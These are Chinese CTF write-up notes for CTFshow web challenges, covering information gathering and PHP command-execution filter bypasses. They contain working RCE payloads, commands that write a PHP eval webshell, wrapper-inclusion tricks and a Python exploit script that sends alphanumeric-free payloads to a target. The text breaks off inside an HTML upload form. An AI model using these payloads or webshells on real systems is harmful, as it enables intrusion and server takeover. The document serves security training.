# 0x01 信息搜集（AK）

### web1

启动靶机，进入环境，提示“开发注释没有删除干净”，尝试打开F12，发现了flag

### web2

提示：js前台拦截 === 无效操作

启动靶机，进入环境，显示无法查看源代码，按F12确实没用。

但是，有一个view-source:协议是浏览器无法过滤的，利用它查看到源代码。

并且得到flag

### web3

提示：没思路的时候抓个包看看，可能会有意外收获

此处需要抓包软件，目前推荐的**BurpSuite**，有能力搞个专业版最好，社区版锁了算力。

启动靶机，进入环境，抓个包先，先不管发出去的。

等靶机响应时BurpSuite有了反应，查看具体内容，发现flag就藏在响应中。解决了

### web4

总有人把后台地址写入robots，帮黑阔大佬们引路。

看来需要后台了，先使用dirsearch扫一遍目录，结果如下

有一个robots.txt可供他人访问，这也与提示相符。

尝试访问得到内容：

```
User-agent: *
Disallow: /flagishere.txt
```

说明不限制浏览器，但不允许爬取flagishere.txt，那我自己访问总没事了吧。你问我怎么知道这个东西的？你自己告诉我的。

### web5

phps源码泄露有时候能帮上忙

启动靶机，进入环境，先扫一下phps看有什么东西没有

还真找到了

然后访问它，发现文件被下载下来了。

打开就能够得到flag

### web6

解压源码到当前目录，测试正常，收工

本题考查源码泄露

那还用说吗？扫一下压缩包，看有没有尚未被删除的备份。

果然找到了，一般都以www.zip或者WWW.zip标明

访问它，将它下载下来。

里面有一个index.php，注释写明flag在另一个文件里面，这就得到了flag，记得弄到网上访问它！

### web7

版本控制很重要，但不要部署到生产环境更重要。

这里主要指的是**版本控制软件**git和svn，说明一会儿又要扫目录了。

很好，刚开始扫描就发现.git的重定向了，即访问.git会自动重定向到它的存档里面。

访问即可得到flag

### web8

版本控制很重要，但不要部署到生产环境更重要。

同web7，扫一下发现了.svn

访问得到flag

### web9

发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了

> vim在进行文件读写时第一次会生成.swp文件，因意外退出后会产生.swo文件，再出现意外会生成.swn文件，而这些文件在意外退出等情况下不会被删除。因此可以用它们得到信息。

访问index.php.swp，发现文件下载下来了，打开发现flag

### web10

cookie 只是一块饼干，不能存放任何隐私数据

那就把cookie弄到手，BurpSuite,启动！

flag就在set-cookie值中。

### web11

域名其实也可以隐藏信息，比如flag.ctfshow.com 就隐藏了一条信息

域名信息需要域名解析服务器告诉我们，所以我们需要问DNS。

同时，题目中写了是txt记录，也就是我们需要确定查询范围

在cmd中输入nslookup -type=txt flag.ctfshow.com即可得到flag

### web12

有时候网上的公开信息，就是管理员的常用密码

进入靶机，是一个网站，先扫目录

看来可利用的部分为admin（401状态，说明服务器需要认证身份）和robots.txt

先访问robots.txt，这里信息

```
User-agent: *
Disallow: /admin/
```

也表示admin目录是一个非常重要的东西。

直接访问发现不知道密码和用户名，根据提示，用户名猜admin，密码猜网站最底下的联系电话。

通过了，拿到flag

### web13

技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码

社会工程学快乐题

扫个目录发现几乎全部都要认证，得找一下口令，那想都不要想，找文档

然后网站底部有个document，把它下载下来后发现最后一页附上了登陆后台和账号密码。

登陆就拿到flag了。

### web14

有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人

启动靶机，进入环境。输入/editor查看编辑器。这个编辑器上传文件时直接访问了服务器自身的目录。

找吧找吧。在var/www/html目录 中，存在 一个nothinghere有一个文件 fl000g.txt 直接访问这个fl000g.txt 即可获得flag!

### web15

公开的信息比如邮箱，可能造成信息泄露，产生严重后果

又是社会工程学问题

先扫描目录，发现有个/admin

访问/admin页面 发现有一个忘记密码操作，需要输入地址 在主页面下面看到QQ邮箱，通过QQ号查询邮箱，是西安的 修改密码成功，用户名 admin 登录成功获得flag

### web16

对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露

启动靶机，进入环境，在url后面加上/tz.php，进入探针，查看phpinfo，在里面找到flag

### web17

备份的sql文件会泄露敏感信息

那就寻找sql文件的备份，扫描目录发现有个backup.sql

下载下来打开即可找到flag



### web18

不要着急，休息，休息一会儿，玩101分给你flag

你赢了，去幺幺零点皮爱吃皮看看

然后得到了flag



### web19

密钥什么的，就不要放在前端了

F12看一下，真就看到密钥了

```
 /**

   * Shortcut functions to the cipher's object interface.

        * @example

             *     var ciphertext = CryptoJS.AES.encrypt(message, key, cfg);
                      *     var plaintext  = CryptoJS.AES.decrypt(ciphertext, key, cfg);
                                 */
```

AES加密

找齐所有要素后进行解密，得到password = i_want_a_36d_girl，成分复杂的东西。

行吧，登录拿flag

### web20

mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。

这个文件放在/db/db.mdb里面

下载下来打开即可得到flag

0x00 几种可以考虑的解法

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }}
```

```php
1、直接执行系统命令
?c=system("tac fla*"); 利用tac与system结合，拿到flag

因为可以利用system来间接执行系统命令，如果flag不在当前目录，也可以利用?c=system("ls"); 来查看到底在哪里。

2、内敛执行 （反字节符）
?c=echo `tac%20fla*`;
注意结尾的分号，注意写writeup时，因为有反字节符，要核对一下是否转义，需要再在页面上确认一下。 利用echo命令和tac相结合来实现。注意flag采用*绕过，`反字节符，是键盘左上角与~在一起的那个。

3、利用参数输入+eval
?c=eval($_GET[1]);&1=phpinfo();
试一下，没问题，可以看到phpinfo的信息。 然后就使用?c=eval($_GET[1]);&1=system(ls);看一下当前目录都有什么，也可以?c=eval($_GET[1]);&1=system("ls /");看一下根目录都有什么。 注意上一行结尾的分号都不能省略。因为是以php代码形式来执行的，所以结尾必须有分号。此外查看根目录时，必须用引号包裹，不太清楚原因，目前觉得因为system的参数必须是string。
也可以尝试写入木马
?c=eval($_GET[1]);&1=file_put_contents("lpp.php", '<?php eval($_POST["cmd"]); ?>'); 访问lpp.php，然后就可以连马。

4、利用参数输入+include
这里的eval也可以换为include，并且可以不用括号。但是仅仅可以用来读文件了。没了include,用require也可以
1)php://filter读文件
?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
?c=?><?=include$_GET[1]?>&1=php://filter/read=convert.base64-
encode/resource=flag.php
2）data://写马，执行命令
?c=include%0A$_GET[a]?>&a=data://text/plain,<?php system("cat flag.php");?>
?c=include%0A$_GET[a]?>&a=data://text/plain,<?php file_put_contents("lpp.php", '<?php eval($_POST["cmd"]);');?>
5、利用cp命令将flag拷贝到别处
?c=system("cp fl*g.php a.txt ");
然后浏览器访问a.txt，读取即可。
    

```

# 0x02 命令执行

## web29（通配符）

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

考虑使用system函数实现命令的执行，构造?c=system("ls");作为测试，发现成功了，网站给出可执行的文件分别为index.php和flag.php，其中默认显示的为index.php。

对于flag.php的访问，可以考虑使用f*，或者在linux系统下插入’‘，”“，\ ("\ "可能会被浏览器强行改为/，小心)来实现绕过。

eval函数是把字符串作为PHP代码执行，过滤了flag，用通配符绕过
payload：/?c=echo `tac fla?.php&#96;;  

如果选择将flag.php内容先复制到另一个文件里，然后再直接访问这个文件，可以得到一个排版更好的内容。

参考payload:

```
?c=echo `cp f* 1.txt`;//写入到文件，然后直接访问1.txt即可。
?c=echo `tac fla?.php`;//tac直接读取
?c=system('grep ctf fl*'); //从flag.php文件中查找包含ctf的字符串
?c=eval($_GET[1]);&1=phpinfo();//制造参数
?c=eval($_GET[1]);&1=show_source('flag.php');
```



## web30（反引号代替system）

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

相比于上一题多过滤了system，php，php中，system可用反引号`绕过，php也用通配符绕过
这里要用echo将执行结果输出一下，不然没有回显

```
payload：
?c=echo `tac fla?.???`;
?c=echo `nl fl''ag.p''hp`;
?c=eval($_GET[1]);&1=show_source('flag.php');
```



## web31（空格绕过）

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

增加了过滤，相比于上一题多过滤了空格和点，点用通配符绕过
收集一下空格绕过姿势：/**/，%0a换行符，%09制表符，其他姿势还有${IFS}，<，<>，{tac,*}
payload：**

```php
/?c=echo//`tac%09f???????`;
01 使用eval嵌套。具体参数：passthru 结合%09
?c=eval($_GET[1]);&1=system('tac flag.php');
其中%09绕过空格 ?c=eval($_GET[1]);&1=passthru("tac%09fla*"); 这里需要注意括号的闭合，&的连接。

02 使用参数：passthru结合 $IFS$9
其中$IFS$9绕过空格，注意转义$符号 ?c=eval($_GET[1]);&1=passthru("tac\$IFS\$9fla*");

03 使用未被过滤的命令。passthru直接读取
?c=passthru(%22tac$IFS$9fla*%22); 也就是passthru("tac\$IFS\$9fla*");

04 使用pos(localeconv)来获取小数点
localeconv可以返回包括小数点在内的一个数组；pos去取出数组中当前第一个元素，也就是小数点。 scandir可以结合它扫描当前目录内容。 ?c=print_r(scandir(pos(localeconv()))); 可以看到当前目录下有flag.php 通过array_reverse把数组逆序，通过next取到第二个数组元素，也即flag.php 然后?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
```



## web32（include逃逸）

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

过滤了挺多的，反引号过滤了，就不能执行system命令了，左括号过滤了，一些函数也不能用了
这里使用include包含方法，包含一个get请求，分号过滤就用?>进行闭合，后面对2进行传参，包含flag.php，直接包含是读不到的，使用php伪协议进行base64编码，然后将回显内容解base64即可
payload：

```php
?c=include$_GET[2]?>&2=php://filter/convert.base64-encode/resource=flag.php
?c=include$_GET[2]?>&2=php://filter/read=convert.base64-encode/resource=flag.php
?c=$nice=include$_GET["url"]?>&url=php://filter/read=convert.base64-
encode/resource=flag.php
```



## web33（include逃逸）

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

payload：

```php
?c=include$_GET[2]?>&2=php://filter/convert.base64-encode/resource=flag.php
?c=include$_GET[2]?>&2=php://filter/read=convert.base64-encode/resource=flag.php
?c=include$_GET[a]?>&a=php://filter/convert.base64-encode/resource=flag.php
?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
GET：/?c=include$_POST[2]?>
POST：2=php://filter/convert.base64-encode/resource=flag.php
```



## web34（include逃逸）

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

多过滤了冒号双引号
payload：

```php
?c=include$_GET[2]?>&2=php://filter/convert.base64-encode/resource=flag.php
?c=include%0A$_GET[a]?>&a=data://text/plain,<?php system("cat flag.php");?>
?c=include%0A$_GET[a]?>&a=data://text/plain,<?php file_put_contents("lpp.php", '<?php eval($_POST["cmd"]);');?>
```



## web35（include逃逸）

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

同上
payload：

```php
?c=include$_GET[2]?>&2=php://filter/convert.base64-encode/resource=flag.php
?c=include%0A$_GET[a]?>&a=data://text/plain,<?php system("cat flag.php");?>
?c=include%0A$_GET[a]?>&a=data://text/plain,<?php file_put_contents("lpp.php", '<?php eval($_POST["cmd"]);');?>
```



## web36（include逃逸）

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

过滤了数字，换个传参
payload：

```php
?c=include$_GET[a]?%3E&a=php://filter/convert.base64-encode/resource=flag.php
?c=include%0A$_GET[a]?>&a=data://text/plain,<?php system("tac flag.php");?>
?c=include%0A$_GET[a]?>&a=data://text/plain,<?php file_put_contents("lpp.php", '<?php eval($_POST["cmd"]);');?>
```



## web37（data，input伪协议）

```php
<?php
//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;    
    }      
}else{
    highlight_file(__FILE__);
}
```

使用php的data伪协议去读
payload：

```php
/?c=data:text/plain,<?php system('tac fla?.php')?>
或/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==
或/?c=php://input  
POST: <?=system('tac flag.php');?>或<?=highlight_file('flag.php');?>
    （注意post传参为x-www-form-urlencoded raw，意味传递任意格式文本，如果这里不是raw的话post会将其转换为键值对导致代码无法执行）
```


![image.png](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/assets/1637843452688-976476c6-c4d7-4b91-b205-ae96395ce232.png%2523)

## web38（data伪协议）

```php
<?php
//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|php|file/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

过滤了php，那么带php的伪协议都不能用了，这里使用data协议，编码或者短标签
payload：

```php
短标签
?c=data://text/plain,<?=`tac fla*`;
编码
?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==
//?c=data://text/plain;base64,<?php system('tac flag.php');?>
```



## web39（data伪协议）

```php
<?php

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");
    }
        
}else{
    highlight_file(__FILE__);
}
```

强制加了一个后缀，不过没什么吊用，payload最后已经闭合，代码必然会执行。
web38不用闭合也能出，但这个题就必须要闭合
payload：

```php
/?c=data://text/plain,<?=`tac fla*`;?>
```


## web40（无参数RCE，各种php函数）

```php
<?php

if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
}
```

好家伙，这个过滤，看来只能用php内置函数了
介绍几个函数：

- localeconv() 返回包含本地数字及货币信息格式的数组，第一个元素通常是点.
- pos() 返回数组中当前元素的值，等价的还有current() reset()
- scandir() 列出目录中的文件和目录
- array_reverse() 数组逆序输出
- next() 取数组下一个元素，默认是取第二个
- show_source() 查看代码

接下来就可以打出一套组合拳：

- 构造pos(localeconv())得到.
- scandir(pos(localeconv()))得到scandir(.)即扫描当前目录下所有文件，本题猜测应该是 . .. flag.php index.php 
- array_reverse(scandir(pos(localeconv())))逆序输出得到index.php flag.php .. .
- next(array_reverse(scandir(pos(localeconv()))))得到flag.php
- show_source(next(array_reverse(scandir(pos(localeconv())))))得到flag.php内容

最后payload：

```php
/?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
其他办法参考无参数RCE
如使用报文头部传参等
```

## web41（无字母数字RCE_或运算）

```php
<?php
if(isset($_POST['c'])){
    $c = $_POST['c'];
if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
        eval("echo($c);");
    }
}else{
    highlight_file(__FILE__);
}
```

过滤了数字和字母还有一些其他符号，导致无字母数字RCE的自增、异或、取反等操作都不能行了，但我们可以利用**或运算符**进行构造payload进行命令执行
思路：

> 通俗解释：
> 例如源码中禁止我们使用了数字3，也就是ascii码值为51，我们可以使用或运算符在没有被禁止的字符中构造出51来，比如19和32没有被禁止，我们进行或运算19|32=51，就可以获得51这个ascii码值，也就是成功得到了数字3

```python
import requests
import urllib
import re
from sys import *
if(len(argv)!=2):
    print("="*50)
    print('USER:python exp.py <url>')
    print("eg:  python exp.py http://ctf.show/")
    print("exit: input exit in function")
    print("="*50)
    exit(0)
url=argv[1]

#生成可用的字符
def write_rce():
    result = ''
    preg = '[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-'
    for i in range(256):
        for j in range(256):
            if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):
                k = i | j
                if k >= 32 and k <= 126:
                    a = '%' + hex(i)[2:].zfill(2)
                    b = '%' + hex(j)[2:].zfill(2)
                    result += (chr(k) + ' ' + a + ' ' + b + '\n')
    f = open('rce.txt', 'w')
    f.write(result)
    
#根据输入的命令在生成的txt中进行匹配
def action(arg):
    s1=""
    s2=""
    for i in arg:
        f=open("rce.txt","r")
        while True:
            t=f.readline()
            if t=="":
                break
            if t[0]==i:
                s1+=t[2:5]
                s2+=t[6:9]
                break
        f.close()
    output="(\""+s1+"\"|\""+s2+"\")"
    return(output)

def main():
    write_rce()
    while True:
        s1 = input("\n[+] your function：")
        if s1 == "exit":
            break
        s2 = input("[+] your command：")
        param=action(s1) + action(s2)
        data={
            'c':urllib.parse.unquote(param)
            }
        r=requests.post(url,data=data)
        print("\n[*] result:\n"+r.text)

main()
```

运行脚本：

python3 无字母数字RCE_或运算.py http://ctfshow.xxx.com

![image-20231110120242520](assets/image-20231110120242520.png)




## web42（%0a截断）

```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." >/dev/null 2>&1");
}else{
    highlight_file(__FILE__);
}
```

> 这次后面多了一个" >/dev/null 2>&1"语句，意思是写入的内容会永远消失，也就是不进行回显
>
> > 1：> 代表重定向到哪里，例如：echo “123” > /home/123.txt
> > 2：/dev/null 代表空设备文件
> > 3：2> 表示stderr标准错误
> > 4：& 表示等同于的意思，2>&1，表示2的输出重定向等同于1
> > 5：1 表示stdout标准输出，系统默认值是1，所以">/dev/null"等同于 “1>/dev/null”
> > 因此，>/dev/null 2>&1 也可以写成“1> /dev/null 2> &1”
> >
> > 那么本文标题的语句执行过程为：
> > 1>/dev/null ：首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，也就是不显示任何信息。
> > 2>&1 ： 接着，标准错误输出重定向到标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。
>
> 也就是我们如果输入`?c=ls`，输出就会被吞掉不进行回显，那该怎么办呢？其实很简单，用`;`号或者`||`等等一些命令分隔符进行命令分隔
> payload如下：

```
我们可以使用换行符截断
/?c=tac *%0a
分隔符分隔
?c=tac flag.php;
```



## web43（%0a截断）

```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

过滤了cat,分号，选用%0a,||来代替
payload：

```
?c=nl flag.php%0a 查看源代码
?c=tac flag.php%0a
?c=tac flag.php||
```



## web44（%0a截断）

```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/;|cat|flag/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

多过滤flag
payload：

```
?c=tac *%0a
?c=tac fla?.php||
?c=tac fla*||
```



## web45（空格绕过）

```php
<?php
  
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| /i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这次把空格也过滤了，ok，使用%09,${IFS}进行绕过，%09是tab的url编码

```php
?c=tac${IFS}*%0a
?c=tac${IFS}fla*||
?c=tac%09fla*||
?c=echo$IFS`tac$IFS*`%0A
```



## web46（%09绕过）

```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这次把数字都过滤了，还把通配符`*`进行了过滤，我们可以改用`?`进行匹配，同时空格的话还是可以继续使用%09，它不属于过滤的数字范畴

过滤了通配符'*'、$，这次使用制表符%09绕过空格

```php
payload：/?c=tac%09fla?????%0a
其他姿势：
/?c=tac<fla''g.php%0a   
/?c=tac<fla''g.php||
/?c=nl<fla''g.php||
```



## web47（%09绕过）

```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

同上
payload：

```php
tab绕过
/?c=tac%09fla?.php%0a
输入重定向
/?c=tac<fla?.php%0a
/?c=tac<fla''g.php%0a
 /?c=tac<fla''g.php||
```



## web48（%09绕过）

```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

看似过滤了%,实则没有，payload还是能用
payload：

```
tab绕过
/?c=tac%09fla?.php%0a
输入重定向
/?c=tac<fla?.php%0a
/?c=tac<fla''g.php%0a
 /?c=tac<fla''g.php||
```



## web49（%09绕过）

```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

同上，这里虽然过滤了%，但是%09会被优先解析成制表符，也就是说先经过浏览器一次url解码，再进行传参
payload：

```
/?c=tac%09fla?.php%0a
看似过滤了%,实则没有，payload还是能用
payload：
tab绕过
/?c=tac%09fla?.php%0a
输入重定向
/?c=tac<fla?.php%0a
/?c=tac<fla''g.php%0a
 /?c=tac<fla''g.php||
```



## web50（''绕过）

```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这一次把制表符过滤了，那就换个姿势，发现在使用<代替空格的时候通配符貌似就不起作用了，所以使用''来绕过flag的匹配，此外使用转义符也是可行的，除了一些特殊字符转义后会成为其他字符外，剩下的转义后还是本身，等同于没转义
payload：

```
?c=tac<fl''ag.php%0a
?c=tac<fla\g.php%0a
?c=tac<fl''ag.php||
```



## web51（''绕过）

```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

过滤了tac，其他常见的打印命令也ban了，其实还有个nl可用，执行后回显1，右键查看源码得到flag,或者用转义符，字母转义还是字母
payload：/

```php
?c=nl<fl''ag.php%0a
?c=nl<fla''g.php||
?c=ta\c<fla\g.php||
?c=ta\c<>fla''g.php%0a
```



## web52（${IFS}绕过）

```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这个题过滤了<，绕过空格还有${IFS}可用
payload：/?c=nl${IFS}fla?.???%0a
查看源码发现
![image.png](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/assets/1637853342916-eb9219b4-c9cd-49bf-be86-abe257504657.png%2523)
？？？我的flag呢，看下目录payload：/?c=ls%0a
![image.png](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/assets/1637853425951-9563e023-b815-4ea2-99fe-0969929a129f.png%2523)
看来flag不在此处，看看根目录payload：/?c=ls${IFS}/%0a
![image.png](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/assets/1637853470065-f03fafa3-81c1-45fc-b368-4eebab029915.png%2523)
第四个文件叫flag，进去看看payload：/?c=nl${IFS}/fla?%0a
答案回显在页面上，完活儿

```
?c=ls${IFS}/%0a
?c=nl${IFS}/fla?%0a
?c=nl$IFS/fla''g||
?c=nl${IFS}/fla''g||
```



## web53（${IFS}绕过）

```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        echo($c);
        $d = system($c);
        echo "<br>".$d;
    }else{
        echo 'no';
    }
}else{
    highlight_file(__FILE__);
}
```

比较简单，不过ls后有个readflag的elf文件，不知道是干啥的
payload：/

```
?c=nl${IFS}fla?.php
```



## web54（/bin/cat）

```php
<?php


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

？？？这个过滤看起来丧心病狂，能用的几乎都ban了，思路是用其他方式执行打印，比如执行cat就去/bin/cat调用等等，这些通常都是存储在/bin目录下的

这次过滤了好多字母，也不能会用`\`的形式进行分割，但还有另一个读取的命令grep可以使用

> grep flag flag.php 查找flag.php文件中含有flag的那一行，并且打印出来

所以我们可以构造payload如下，在flag.php中查找带有show字符串的一行(因为flag的格式为ctfshow{})

```
?c=/bin/ca?${IFS}f?ag.php右键查看源码即可得到flag
?c=/bin/?at${IFS}f???????
?c=grep${IFS}show${IFS}fl?g.php
```

## web55（无字母命令执行）

```php
<?php

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

这次把字母都给禁掉了，一般遇到这情况最容易想到的应该是进行异或运算等等办法进行构造，在这里他没有禁掉数字，我们有其他略微方便点的方法，就是通过匹配bin下存在的命令进行读取flag

**解法一**

> bin为binary的简写，主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。
> 我们日常直接使用的cat或者ls等等都其实是简写，例如ls完整全称应该是/bin/ls

这里没有禁用数字所以我们可以使用base64命令，构造如下

```
?c=/???/????64 ????.???                     也就是?c=/bin/base64 flag.php
```

![img](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/assets/2L8OFD(V3OTMN%257DI6)H%252524NA9.png)
再进行解码即可得到flag
![image-20231117105152637](assets/image-20231117105152637.png)

**解法二**

这道题过滤了字母，看了大佬文章才逐渐理解，这里主要是复现
推荐：[p神博客](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)
有两个有趣的知识点：

1. shell下可以利用.来执行任意脚本
1. Linux文件名支持用glob通配符代替

.相当于source，执行一个文件中的命令，那和这题有什么关系呢，我们知道，上传到服务器的文件通常会被创建一个副本保存在指定目录下，而默认目录一般是/tmp/phpXXXXXX，最后六个字符是随机的大小写字母。那我们是不是就可以利用source去执行这个文件呢，确实可以，可以通过构造一个POST数据包进行上传，然后执行服务器上的临时文件，但是文件名有六个字母未知怎么办。可以区分的是，tmp目录下其中的文件是不会有大写字母的，换句话说，最后一个字符是不会出现大写字母的，而恰巧我们上传的文件会有概率被分配到一个包含大写字母的文件名，这一点是区分关键。
接下来是通配符，我们可以用/???/?????????表示/tmp/phpXXXXXX的所有文件，如果要表示大写字符，可以用[@-[]表示，意思是匹配ASCII码在@-[之前所有的字符，而这个区间对应的正好是A-Z
所以payload为：/?c=.+/???/????????[@-[]

- 第一步：构造一个POST请求上传文件

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
  <!--链接请自行更换-->
